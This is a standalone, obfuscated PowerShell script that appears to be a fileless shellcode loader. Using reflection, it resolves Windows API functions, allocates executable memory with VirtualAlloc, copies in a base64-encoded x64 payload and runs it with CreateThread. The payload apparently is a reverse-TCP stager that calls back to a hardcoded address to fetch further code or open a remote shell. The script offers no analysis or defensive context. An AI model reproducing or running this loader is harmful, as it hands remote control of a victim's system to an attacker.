function uVTPs70_W {
	Param ($sAL, $q72thh)		
	$pOI8As = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $pOI8As.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($pOI8As.GetMethod('GetModuleHandle')).Invoke($null, @($sAL)))), $q72thh))
}

function ogZO4il1v {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $zoMpt,
		[Parameter(Position = 1)] [Type] $muU = [Void]
	)
	
	$hZJPbK0WM1 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$hZJPbK0WM1.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $zoMpt).SetImplementationFlags('Runtime, Managed')
	$hZJPbK0WM1.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $muU, $zoMpt).SetImplementationFlags('Runtime, Managed')
	
	return $hZJPbK0WM1.CreateType()
}

[Byte[]]$mfSTIJywL8 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAF99rBuyC0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoFQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZu+AdKgpBidr/1Q==")
		
$o6t0Z = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uVTPs70_W kernel32.dll VirtualAlloc), (ogZO4il1v @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $mfSTIJywL8.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($mfSTIJywL8, 0, $o6t0Z, $mfSTIJywL8.length)

$tufVU5 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uVTPs70_W kernel32.dll CreateThread), (ogZO4il1v @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$o6t0Z,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uVTPs70_W kernel32.dll WaitForSingleObject), (ogZO4il1v @([IntPtr], [Int32]))).Invoke($tufVU5,0xffffffff) | Out-Null